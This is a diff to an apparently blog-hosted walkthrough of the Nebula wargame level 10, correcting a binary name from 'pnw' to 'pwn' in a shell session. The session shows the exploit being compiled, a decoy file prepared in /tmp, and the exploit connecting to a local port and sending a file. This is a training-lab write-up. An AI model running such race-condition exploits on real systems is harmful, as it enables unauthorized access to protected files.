@@ -79,9 +79,9 @@ int main(int argc, char *argv[])
 {% endhighlight %}
 Compile, prepare "_/tmp/dummy_", execute and "_Veni Vidi Vici_".
 {% highlight sh linenos %}
-level10@nebula:~$ gcc -o pnw PWN_10.c
+level10@nebula:~$ gcc -o pwn PWN_10.c
 level10@nebula:~$ echo "some text" > /tmp/dummy
-level10@nebula:~$ ./pnw
+level10@nebula:~$ ./pwn
 You don't have access to /tmp/lure
 Connecting to 127.0.0.1:18211 .. Connected!
 Sending file ..
